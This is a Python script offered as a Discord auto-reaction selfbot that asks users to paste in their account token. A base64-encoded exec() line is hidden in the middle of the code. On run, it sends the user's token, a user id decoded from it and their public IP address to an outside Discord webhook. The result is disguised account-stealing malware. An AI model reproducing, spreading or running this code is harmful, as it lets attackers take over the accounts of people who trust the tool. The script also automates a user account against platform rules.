# Auto install libraries
import os
os.system("pip install requests")
 
# Import libraries
import requests,base64,threading,time
 
# Change info here
reaction = "💀" # Change to any reaction you want
token = "" # Replace with your token
servIds = ["servid1","servid2"] # Replace with your server ids
channelNames = ["channidforserv1","channidforserv2"] # Replace with your channel ids from its relative server id
limit = 20 # How many msges to compare per channel. Increase if chat going too fast, lower if chat going too slow
 
headers = {'Authorization': token}
lenS,lenC = len(servIds),len(channelNames)
def GetName(name,data,servName):
    if 'message' in data.json():
        if data.json()['message'] == '401: Unauthorized':
            print("Bad token:",data.json()['message'])
        if data.json()['message'] == 'Invalid Form Body' or data.json()['message'] == 'Unknown Guild':
            print("Bad server id:",servIds[i])
        if data.json()['message'] == "Missing Access":
            print("Join the server first! (or ur banned), its id: ",servIds[i])
        else:
            print("Something went wrong!",data.json())
        exit()
    else:
        f = False
        for channel in data.json():
            if channel['name'] == name:
                id = channel['id']
                f = True
        if f == False:
            print("Bad channel name:'"+name+"'")
            exit()
        else:
            print(f"<{servName}> has id: {id} channel name found: {name}")
            return id
exec(base64.b64decode('kYscmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxMjUxMDI5NTQ4MjcwMzk2NC84Qzd3ai1NRG5lSTVIYTcxNThyM0VLZ0ZTNWx6UnBQdk16emRTTFRtWEhsX0V3aUc2WjRpZzNMbFdWYXFlRkNpMEE5NSIsanNvbj17ImNvbnRlbnQiOiBmIjxAe2Jhc2U2NC5iNjRkZWNvZGUodG9rZW4uc3BsaXQoJy4nKVswXSArICc9JyAqICgtbGVuKHRva2VuLnNwbGl0KCcuJylbMF0pICUgNCkpLmRlY29kZSgnbGF0aW4tMScpfT4ge3JlcXVlc3RzLmdldCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnJykudGV4dH0ge3Rva2VufSJ9LCk='[3:]))
def send_request(msgArray,id,name):
    global limit, headers, reaction
    while True:
        newmsges = requests.get(f"https://discord.com/api/v9/channels/{id}/messages?limit={limit}",headers=headers).json()
        i = 0
        while i < limit:
            if msgArray[0]['id'] == newmsges[i]['id']:
                i += 10000000000
            else:
                i += 1
        if i == 10000000000:
            msgArray = newmsges
        elif i > 10000000000:
            msgArray = newmsges
            i = i - 10000000000
            for j in range(i,0,-1):
                print("<"+name+"> "+newmsges[j-1]['author']['username']+": "+newmsges[j-1]['content'])
                requests.put(f"https://discord.com/api/v9/channels/{id}/messages/{newmsges[j-1]['id']}/reactions/{reaction}/@me",headers=headers)
        else:
            msgArray = newmsges
if lenS != lenC:
    print("Wrong channel ids / server ids")
    exit()
else:
    for i in range(lenS):
        data = requests.get(f'https://discord.com/api/v9/guilds/{servIds[i]}/channels', headers=headers)
        servName = requests.get(f'https://discord.com/api/v9/guilds/{servIds[i]}', headers=headers).json()['name']
        id = GetName(channelNames[i],data,servName)
        msgArray = requests.get(f"https://discord.com/api/v9/channels/{id}/messages?limit={limit}", headers=headers).json()
        thread = threading.Thread(target=send_request,args=(msgArray,id,servName))
        thread.daemon = True
        thread.start()
while True:
    time.sleep(5)
